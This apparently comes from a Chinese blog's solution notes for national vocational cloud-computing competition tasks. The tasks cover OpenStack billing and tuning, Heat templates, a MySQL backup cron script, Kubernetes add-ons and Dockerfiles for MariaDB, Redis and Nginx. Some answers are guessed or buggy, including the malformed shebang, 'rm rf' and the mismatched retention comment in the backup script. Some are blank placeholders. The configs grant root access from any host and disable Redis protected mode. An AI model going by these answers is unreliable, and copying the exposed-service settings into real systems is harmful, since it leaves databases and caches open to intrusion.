class="line">+--------------------+--------+----------+----+--------------------+----------+--------+----------+</span><br></pre></td></tr></table></figure>

<p><strong>云硬盘服务费用</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建云硬盘服务费用volume_size</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap service create volume_size</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Name        | Service ID                           |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| volume_size | 6bd25052-eb27-49b1-ad68-aab723059a95 |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line"><span class="comment">#设置价格为1.2元</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap mapping create -s 6bd25052-eb27-49b1-ad68-aab723059a95 -t flat 1.2</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+</span><br><span class="line">| Mapping ID                           | Value | Cost       | Type | Field ID | Service ID                           | Group ID | Project ID |</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+</span><br><span class="line">| bd57621f-523b-43f2-89fb-2ea07fd04fac | None  | 1.20000000 | flat | None     | 6bd25052-eb27-49b1-ad68-aab723059a95 | None     | None       |</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>镜像服务费用</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建镜像收费服务image_size_test</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap service create image_size_test</span><br><span class="line">+-----------------+--------------------------------------+</span><br><span class="line">| Name            | Service ID                           |</span><br><span class="line">+-----------------+--------------------------------------+</span><br><span class="line">| image_size_test | 80a098cf-d793-47cf-b63e-df6cbd56e88d |</span><br><span class="line">+-----------------+--------------------------------------+</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">并为该服务单价设置为0.8元</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap mapping create -s  80a098cf-d793-47cf-b63e-df6cbd56e88d   -t flat 0.8 </span><br><span class="line">+--------------------+-------+------------+------+----------+--------------------+--------+----------+</span><br><span class="line">| Mapping ID         | Value | Cost       | Type | Field ID | Service ID         |Group ID|Project ID|</span><br><span class="line">+--------------------+-------+------------+------+----------+--------------------+--------+----------+</span><br><span class="line">| 64952e70-6e37-4c8a | None  | 0.80000000 | flat | None     | 80a098cf-d793-47cf | None   | None     |</span><br><span class="line">  -9d3a-b4c70de1fb87                                          -b63e-df6cbd56e88d</span><br><span class="line">+--------------------+-------+------------+------+----------+--------------------+--------+----------</span><br></pre></td></tr></table></figure>

<h1 id="第三套"><a href="#第三套" class="headerlink" title="第三套"></a>第三套</h1><h2 id="OpenStack云平台运维"><a href="#OpenStack云平台运维" class="headerlink" title="OpenStack云平台运维"></a>OpenStack云平台运维</h2><p><strong>2.在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：</strong></p>
<p>（1）预留前2个物理CPU，把后面的所有CPU分配给虚拟机使用（假设vcpu为16个）；</p>
<p>（2）设置cpu超售比例为4倍；</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/nova/nova.conf</span><br><span class="line"><span class="comment">###不知道哪个对</span></span><br><span class="line">cpu_dedicated_set = 2</span><br><span class="line">cpu_shared_set = 14</span><br><span class="line"></span><br><span class="line">vcpu_pin_set = 2-15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cpu_allocation_ratio = 4.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3.在提供的OpenStack平台上，对mencached服务进行操作使memcached的缓存由64MB变为256MB。</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/memcached</span><br><span class="line">CACHESIZE=<span class="string">&quot;256&quot;</span></span><br></pre></td></tr></table></figure>

<p>4.在提供的OpenStack平台上，编写heat模板createnet.yml文件，模板作用为按照要求创建一个网络和子网。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@controller</span> <span class="string">~</span>]<span class="comment"># cat createnet.yml</span></span><br><span class="line"><span class="attr">heat_template_version:</span> <span class="number">2018-08-31</span></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line">  <span class="attr">net1:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Neutron::Net</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">net1</span></span><br><span class="line">  <span class="attr">net-subnet:</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">cidr:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">net1-subent</span></span><br><span class="line">      <span class="attr">enable_dhcp:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">gateway_ip:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">      <span class="attr">allocation_pools:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">start:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.100</span></span><br><span class="line">          <span class="attr">end:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.200</span></span><br><span class="line">      <span class="attr">network:</span> &#123;<span class="attr">get_resource:</span> <span class="string">net1</span>&#125;</span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Neutron::Subnet</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建网络</span></span><br><span class="line"><span class="string">openstack</span> <span class="string">stack</span> <span class="string">create</span> <span class="string">-t</span> <span class="string">createnet.yml</span> <span class="string">net</span></span><br></pre></td></tr></table></figure>

<p><strong>5.使用提供的OpenStack私有云平台，修改普通用户权限，使普通用户不能对镜像进行创建和删除操作</strong>从（参考<a href="https://blog.csdn.net/wangjinruifly/article/details/79706807?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-79706807-blog-94681036.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-79706807-blog-94681036.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">(1条消息) OpenStack Keystone (2): 角色权限管理_hhzzk的博客-CSDN博客_openstack 角色 权限</a>）</p>
<p><a href="https://blog.csdn.net/weixin_33963594/article/details/94681036">(2条消息) openstack 权限控制 （添加自定义角色）keystone等组件_weixin_33963594的博客-CSDN博客</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/glance/policy.json</span><br><span class="line"> <span class="string">&quot;add_image&quot;</span>: <span class="string">&quot;role:admin&quot;</span>,</span><br><span class="line"> <span class="string">&quot;delete_image&quot;</span>: <span class="string">&quot;role:admin&quot;</span>,</span><br></pre></td></tr></table></figure>

<p><strong>9.在OpenStack私有云平台，创建一台云主机，编写脚本，要求可以完成数据库的定期备份，并把数据库备份文件存放在&#x2F;opt目录下。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bin/bash</span><br><span class="line">#备份路径</span><br><span class="line">BACKUP=/root/mysql-backup</span><br><span class="line">#数据库的定时备份</span><br><span class="line">DATETIME=`date +%Y_%m_%d_%H%%M%S`</span><br><span class="line">#echo &quot;$DATETIME&quot;</span><br><span class="line">echo &quot;====start backup to $BACKUP/$DATETIME/$DATETIME.tar.gz=====&quot;</span><br><span class="line">#主机</span><br><span class="line">HOST=rabbitmq</span><br><span class="line">DB_USER=xy</span><br><span class="line">DB_PWD=000000</span><br><span class="line">#要备份的数据库名</span><br><span class="line">DATABASE=xy</span><br><span class="line">#创建备份的路径，如果路径不存在就创建</span><br><span class="line">[ ! -d &quot;$BACKUP/$DATETIME&quot; ] &amp;&amp; mkdir -p &quot;$BACKUP/$DATETIME&quot;</span><br><span class="line">#执行mysql的备份数据库指令</span><br><span class="line">mysqldump -u$&#123;DB_USER&#125; -p$&#123;DB_PWD&#125; --host=$HOST $DATABASE | gzip &gt; $BACKUP/$DATETIME/$DATETIME.sql.gz</span><br><span class="line">#打包备份文件</span><br><span class="line">cd $BACKUP</span><br><span class="line">tar -zcvf $DATETIME.tar.gz $DATETIME</span><br><span class="line">#删除临时目录</span><br><span class="line">rm -rf $BACKUP/$DATETIME</span><br><span class="line">#删除1天前的备份文件</span><br><span class="line">#在$backup目录下按照时间找10天前的名称为*.tar.gz的文件，-exec表示执行找到的文件</span><br><span class="line">find $BACKUP -mtime +1 -name &quot;*.tar.gz&quot; -exec rm rf &#123;&#125; \;</span><br><span class="line">echo &quot;============backup success============&quot;</span><br><span class="line">#加入定时任务表示每天8点30分执行后面的命令（shell脚本的路径）</span><br><span class="line">crontab -e</span><br><span class="line">30 8 * * * /root/mysql_backup.sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年全国职业院校技能大赛容器云</title>
    <url>/posts/9bf3df10.html</url>
    <content><![CDATA[<h2 id="【任务-1】容器云平台搭建-5-分"><a href="#【任务-1】容器云平台搭建-5-分" class="headerlink" title="【任务 1】容器云平台搭建[5 分]"></a>【任务 1】容器云平台搭建[5 分]</h2><p><img src="https://img-blog.csdnimg.cn/7f7156ba530246dc8e3dee2963642f03.png" alt="在这里插入图片描述"></p>
<h3 id="【题目-1】平台部署–部署容器云平台-1-5-分"><a href="#【题目-1】平台部署–部署容器云平台-1-5-分" class="headerlink" title="【题目 1】平台部署–部署容器云平台[1.5 分]"></a>【题目 1】平台部署–部署容器云平台[1.5 分]</h3><p>登录OpenStack 私有云平台，使用 CentOS7.9 镜像创建两台云主机，使用 kubeeasy 工具完成Kubernetes 1.22.1 集群的搭建。然后使用 nginx 镜像在 default 命名空间下创建一个名为exam 的Pod，并为该 Pod 设置环境变量 exam，其值为 2022。<br>完成后提交 master 节点的用户名、密码和 IP 到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#两台节点，将提供的安装包 chinaskills_cloud_paas_v2.0.2.iso 上传至 master 节点/root 目录，并解压 到/opt 目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># mount -o loop chinaskills_cloud_paas_v2.0.2.iso /mnt/ </span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp -rfv /mnt/* /opt/ </span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># umount /mnt/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 kubeeasy已经依赖</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># mv /opt/kubeeasy /usr/bin/kubeeasy</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># kubeeasy install depend \ --host 10.24.2.10,10.24.2.11 \ --user root \ --password 000000 \ --offline-file /opt/dependencies/base-rpms.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="literal">--host</span>：所有主机节点 IP，如：<span class="number">10.24</span>.<span class="number">1.2</span><span class="literal">-10</span>.<span class="number">24.1</span>.<span class="number">10</span>，中间用“-”隔开，表示 <span class="number">10.24</span>.<span class="number">1.2</span> 到 <span class="number">10.24</span>.<span class="number">1.10</span> 范围内的所有 IP。若 IP 地址不连续，则列出所有节点 IP，用逗号隔开，如： <span class="number">10.24</span>.<span class="number">1.2</span>,<span class="number">10.24</span>.<span class="number">1.7</span>,<span class="number">10.24</span>.<span class="number">1.9</span>。 </span><br><span class="line"><span class="literal">--user</span>：主机登录用户，默认为 root。 </span><br><span class="line"><span class="literal">--password</span>：主机登录密码，所有节点需保持密码一致。 </span><br><span class="line"><span class="literal">--offline-file</span>：离线安装包路径。</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置 SSH 免密钥</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># kubeeasy create ssh-keygen \ --master 10.24.2.10 \ --worker 10.24.2.11 \ --user root --password 000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#部署 Kubernetes 集群</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># kubeeasy install kubernetes \ --master 10.24.2.10 \ --worker 10.24.2.11 \ --user root \ --password 000000 \ --version 1.22.1 \ --offline-file /opt/kubernetes.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看集群信息</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubectl cluster-info </span></span><br><span class="line">Kubernetes control plane is running at https://apiserver.cluster.local:<span class="number">6443</span> CoreDNS is running at https://apiserver.cluster.local:<span class="number">6443</span>/api/v1/namespaces/kube<span class="literal">-system</span>/services/kube<span class="literal">-dns</span>:dns/proxy To further debug and diagnose cluster problems, use <span class="string">&#x27;kubectl cluster-info dump&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解释</span></span><br><span class="line"><span class="literal">--master</span>：Master 节点 IP。 </span><br><span class="line"><span class="literal">--worker</span>：Node 节点 IP，如有多个 Node 节点用逗号隔开。 </span><br><span class="line"><span class="literal">--version</span>：Kubernetes 版本，此处只能为 <span class="number">1.22</span>.<span class="number">1</span>。</span><br></pre></td></tr></table></figure>

<p>1.Kubernetes 集群部署成功得 1 分；<br>2.Pod 创建成功且环境变量设置正确得 0.5 分。</p>
<h3 id="【题目-2】平台部署–部署-Istio-服务网格-0-5-分"><a href="#【题目-2】平台部署–部署-Istio-服务网格-0-5-分" class="headerlink" title="【题目 2】平台部署–部署 Istio 服务网格[0.5 分]"></a>【题目 2】平台部署–部署 Istio 服务网格[0.5 分]</h3><p>1.Kubernetes 集群部署成功得 1 分；<br>2.Pod 创建成功且环境变量设置正确得 0.5 分。</p>
<p>在 Kubernetes 集群上完成 Istio 服务网格环境的安装，然后新建命名空间 exam，为该命名空间开启自动注入 Sidecar。<br>完成后提交 master 节点的用户名、密码和 IP 到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubeeasy add --istio istio</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://blog.csdn.net/shida_csdn/article/details/90713235</span></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubectl create ns exam</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubectl label namespace exam istio-injection=enabled</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Istio 所有组件运行成功得 0.3 分；<br>2.命名空间 exam 自动注入成功得 0.2 分。</p>
<h3 id="【题目-3】平台部署–部署-KubeVirt-虚拟化-1-分"><a href="#【题目-3】平台部署–部署-KubeVirt-虚拟化-1-分" class="headerlink" title="【题目 3】平台部署–部署 KubeVirt 虚拟化[1 分]"></a>【题目 3】平台部署–部署 KubeVirt 虚拟化[1 分]</h3><p>在 Kubernetes 集群上完成KubeVirt 虚拟化环境的安装。完成后提交 master 节点的用户名、密码和 IP 到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubeeasy add --virt kubevirt</span></span><br></pre></td></tr></table></figure>

<p>1.KubeVirt 所有组件运行成功得 1 分。</p>
<h3 id="【题目-4】平台部署–部署-Harbor-仓库及Helm-包管理工具-1-分"><a href="#【题目-4】平台部署–部署-Harbor-仓库及Helm-包管理工具-1-分" class="headerlink" title="【题目 4】平台部署–部署 Harbor 仓库及Helm 包管理工具[1 分]"></a>【题目 4】平台部署–部署 Harbor 仓库及Helm 包管理工具[1 分]</h3><p>在 master 节点上完成Harbor 镜像仓库及Helm 包管理工具的部署。然后使用 nginx 镜像自定义一个 Chart，Deployment 名称为 nginx，副本数为 1，然后将该 Chart 部署到 default 命名空间下，Release 名称为 web。<br>完成后提交 master 节点的用户名、密码和 IP 到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubeeasy add --registry harbor</span></span><br></pre></td></tr></table></figure>

<p>1.Harbor 仓库部署成功得 0.5 分；<br>2.Helm 工具安装成功得 0.2 分；<br>3.Chart 包部署成功得 0.3 分。</p>
<h3 id="【题目-5】集群管理–备份-ETCD-数据-1-分"><a href="#【题目-5】集群管理–备份-ETCD-数据-1-分" class="headerlink" title="【题目 5】集群管理–备份 ETCD 数据[1 分]"></a>【题目 5】集群管理–备份 ETCD 数据[1 分]</h3><p>Kubernetes 使用 ETCD 来存储集群的实时运行数据，为防止服务器宕机导致 Kubernetes集群数据丢失，请将Kubernetes 集群数据备份到&#x2F;root&#x2F;etcd.db 中。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/lihongbao80/article/details/<span class="number">126508726</span></span><br></pre></td></tr></table></figure>

<p>1.etcdctl 工具安装成功得 0.2 分；<br>2.ETCD 数据备份成功得 0.8 分。</p>
<h2 id="【任务-2】容器云应用部署：Docker-Compose-编排部署-7-0-分"><a href="#【任务-2】容器云应用部署：Docker-Compose-编排部署-7-0-分" class="headerlink" title="【任务 2】容器云应用部署：Docker Compose 编排部署[7.0 分]"></a>【任务 2】容器云应用部署：Docker Compose 编排部署[7.0 分]</h2><p>Hyperf 是一个高性能、高灵活性的渐进式 PHP 协程框架，内置协程服务器及大量常用的组件，性能较传统基于 PHP-FPM 的框架有质的提升，提供超高性能的同时，也保持着极其灵活的可扩展性。请根据要求完成数据库服务 MariaDB、缓存服务 Redis、微服务 Hyperf 及前端服务Nginx 按照要求进行容器化。</p>
<h3 id="【题目-1】容器化-MariaDB-服务-1-分"><a href="#【题目-1】容器化-MariaDB-服务-1-分" class="headerlink" title="【题目 1】容器化 MariaDB 服务[1 分]"></a>【题目 1】容器化 MariaDB 服务[1 分]</h3><p>编写Dockerfile 文件构建hyperf-mariadb:v1.0 镜像，具体要求如下：（需要用到的软件包：<br>Hyperf.tar.gz）</p>
<p>（1）基础镜像：centos:7.9.2009；<br>（2）完成 MariaDB 服务的安装；<br>（3）声明端口：3306；<br>（4）设置数据库 root 用户的密码为root；<br>（5）将提供的数据库文件 hyperf_admin.sql 导入数据库；<br>（6）设置服务开机自启。<br>完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">没有具体的软件包，同理的代替一下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#mysql初始化自启动脚本</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># cat mysql_init.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">mysql_install_db <span class="literal">--user</span>=root</span><br><span class="line">mysqld_safe <span class="literal">--user</span>=root &amp;</span><br><span class="line"><span class="built_in">sleep</span> <span class="number">8</span></span><br><span class="line">mysqladmin <span class="literal">-u</span> root password <span class="string">&#x27;root&#x27;</span></span><br><span class="line">mysql <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="literal">-e</span> <span class="string">&quot;grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;root&#x27;; flush privileges;&quot;</span></span><br><span class="line">mysql <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="literal">-e</span> <span class="string">&quot; source /opt/pig.sql;source /opt/pig_codegen.sql;source /opt/pig_config.sql; source /opt/pig_job.sql;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#本地yum源</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># cat local.repo</span></span><br><span class="line">[<span class="type">pig</span>]</span><br><span class="line">name=pig</span><br><span class="line">baseurl=file:///root/yum</span><br><span class="line">gpgcheck=<span class="number">0</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># cat Dockerfile-mariadb</span></span><br><span class="line">FROM centos:centos7.<span class="number">9.2009</span></span><br><span class="line">MAINTAINER Chinaskills</span><br><span class="line">RUN <span class="built_in">rm</span> <span class="literal">-rf</span> /etc/yum.repos.d/*</span><br><span class="line"><span class="built_in">COPY</span> local.repo /etc/yum.repos.d/</span><br><span class="line"><span class="built_in">COPY</span> yum /root/yum</span><br><span class="line">ENV LC_ALL en_US.UTF<span class="literal">-8</span></span><br><span class="line">RUN yum <span class="literal">-y</span> install mariadb<span class="literal">-server</span></span><br><span class="line"><span class="built_in">COPY</span> mysql /opt/</span><br><span class="line"><span class="built_in">COPY</span> mysql_init.sh /opt/</span><br><span class="line">RUN bash /opt/mysql_init.sh</span><br><span class="line">EXPOSE <span class="number">3306</span></span><br><span class="line">CMD [<span class="string">&quot;mysqld_safe&quot;</span>,<span class="string">&quot;--user=root&quot;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># docker build -t hyperf-mariadb:v1.0 -f Dockerfile-mariadb .</span></span><br></pre></td></tr></table></figure>

<p>1.镜像构建成功得 0.5 分；<br>2.数据库安装且导入数据成功得 0.5 分。</p>
<p>【题目 2】容器化Redis 服务[1 分]</p>
<p>编写 Dockerfile 文件构建 hyperf-redis:v1.0 镜像，具体要求如下：（需要用到的软件包：<br>Hyperf.tar.gz）<br>（1）基础镜像：centos:7.9.2009；<br>（2）安装Redis 服务；<br>（3）关闭保护模式；<br>（4）声明端口：6379；<br>（5）设置服务开机自启。<br>完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># cat Dockerfile-redis</span></span><br><span class="line">FROM centos:centos7.<span class="number">9.2009</span></span><br><span class="line">MAINTAINER Chinaskills</span><br><span class="line">RUN <span class="built_in">rm</span> <span class="literal">-rf</span> /etc/yum.repos.d/*</span><br><span class="line"><span class="built_in">COPY</span> local.repo /etc/yum.repos.d/</span><br><span class="line"><span class="built_in">COPY</span> yum /root/yum</span><br><span class="line">RUN yum <span class="literal">-y</span> install redis</span><br><span class="line">RUN sed <span class="literal">-i</span> <span class="string">&#x27;s/127.0.0.1/0.0.0.0/g&#x27;</span> /etc/redis.conf &amp;&amp; \</span><br><span class="line">   sed <span class="literal">-i</span> <span class="string">&#x27;s/protected-mode yes/protected-mode no/g&#x27;</span> /etc/redis.conf</span><br><span class="line">EXPOSE <span class="number">6379</span></span><br><span class="line">CMD [<span class="string">&quot;/usr/bin/redis-server&quot;</span>,<span class="string">&quot;/etc/redis.conf&quot;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># docker build -t  hyperf-redis:v1.0  -f Dockerfile-redis .</span></span><br></pre></td></tr></table></figure>

<p>1.镜像构建成功的 0.5 分；<br>2.Redis 服务安装成功且配置正确得 0.5 分。</p>
<h3 id="【题目-3】容器化Nginx-服务-0-5-分"><a href="#【题目-3】容器化Nginx-服务-0-5-分" class="headerlink" title="【题目 3】容器化Nginx 服务[0.5 分]"></a>【题目 3】容器化Nginx 服务[0.5 分]</h3><p>编写 Dockerfile 文件构建hyperf-nginx:v1.0 镜像，具体要求如下：（需要用到的软件包：<br>Hyperf.tar.gz）<br>（1）基础镜像：centos:7.9.2009；<br>（2）安装nginx 服务；<br>（3）声明端口：80；<br>（4）设置服务开机自启。<br>完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># cat Dockerfile-nginx</span></span><br><span class="line">FROM centos:centos7.<span class="number">9.2009</span></span><br><span class="line">MAINTAINER Chinaskills</span><br><span class="line">RUN <span class="built_in">rm</span> <span class="literal">-rf</span> /etc/yum.repos.d/*</span><br><span class="line"><span class="built_in">COPY</span> local.repo /etc/yum.repos.d/</span><br><span class="line"><span class="built_in">COPY</span> yum /root/yum</span><br><span class="line">RUN yum <span class="literal">-y</span> install nginx</span><br><span class="line">EXPOSE <span class="number">80</span></span><br><span class="line">CMD [<span class="string">&quot;nginx&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;daemon off;&quot;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">worker</span>-<span class="type">node1</span> <span class="type">Pig</span>]<span class="comment"># docker build -t hyperf-nginx:v1.0 -f Dockerfile-nginx .</span></span><br></pre></td></tr></table></figure>

<p>1.镜像构建成功得 0.3 分；<br>2.Nginx 安装成功且配置正确得 0.2 分。</p>
<h3 id="【题目-4】容器化Hyperf-服务-1-分"><a href="#【题目-4】容器化Hyperf-服务-1-分" class="headerlink" title="【题目 4】容器化Hyperf 服务[1 分]"></a>【题目 4】容器化Hyperf 服务[1 分]</h3><p>编写Dockerfile 文件构建hyperf-service:v1.0 镜像，具体要求如下：（需要用到的软件包：<br>Hyperf.tar.gz）<br>（1）基础镜像：centos:7.9.2009；<br>（2）安装 PHP 及扩展；<br>（3）使用源码编译安装Swoole。<br>完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">在这里插入代码片</span><br></pre></td></tr></table></figure>

<p>1.镜像构建成功得 0.5 分；<br>2.PHP 安装成功得 0.2 分；<br>3.Swoole 安装成功得 0.3 分。</p>
<h3 id="【题目-5】编排部署Hyperf-框架-3-5-分"><a href="#【题目-5】编排部署Hyperf-框架-3-5-分" class="headerlink" title="【题目 5】编排部署Hyperf 框架[3.5 分]"></a>【题目 5】编排部署Hyperf 框架[3.5 分]</h3><p>编写&#x2F;root&#x2F;hyperf&#x2F;project&#x2F;docker-compose.yaml 文件，具体要求如下：<br>（1）容器 1 名称：hyperf-mysql；镜像：hyperf-mariadb:v1.0；端口映射：3306:3306；<br>（2）容器 2 名称：hyperf-redis；镜像：hyperf-redis:v1.0；<br>（3）容器 3 名称：hyperf-ui；镜像：hyperf-nginx:v1.0；端口映射：80:8081；<br>（4）容器 4 名称：hyperf-service；镜像：hyperf-service:v1.0。<br>完成后编排部署Hyperf 框架，并提交master 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">在这里插入代码片</span><br></pre></td></tr></table></figure>

<p>.docker-compose.yaml 文件编排成功得 1.5 分；<br>2.8081 端口访问服务成功得 1 分；<br>3.Hyperf-service 连接数据库和Redis 成功得 1 分。</p>
<h2 id="【任务-3】容器云应用部署：基于-Kubernetes-构建-CICD-8-0-分"><a href="#【任务-3】容器云应用部署：基于-Kubernetes-构建-CICD-8-0-分" class="headerlink" title="【任务 3】容器云应用部署：基于 Kubernetes 构建 CICD[8.0 分]"></a>【任务 3】容器云应用部署：基于 Kubernetes 构建 CICD[8.0 分]</h2><p>该公司决定采用Kubernetes + GitLab CI 来构建 CICD 环境，以缩短新功能开发上线周期，及时满足客户的需求，实现 DevOps 的部分流程，来减轻部署运维的负担，实现可视化容器生命周期管理、应用发布和版本迭代更新，请完成GitLab CI + Kubernetes 的 CICD 环境部署（构建持续集成所需要的所有软件包在软件包 CICD-Runner.tar.gz 中）。CICD 应用系统架构如下：</p>
<h3 id="【题目-1】安装GitLab-环境-1-分"><a href="#【题目-1】安装GitLab-环境-1-分" class="headerlink" title="【题目 1】安装GitLab 环境[1 分]"></a>【题目 1】安装GitLab 环境[1 分]</h3><p>在Kubernetes 集群中新建命名空间gitlab-ci，将GitLab 部署到该命名空间下，Deployment和 Service 名称均为gitlab，以 NodePort 方式将 80 端口对外暴露为 30880，设置 GitLab 服务root 用户的密码为 admin@123，将项目包 demo-2048.tar.gz 导入到 GitLab 中并命名为demo-2048。<br>完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径<br>CICD-Runner.tar.gz）</p>
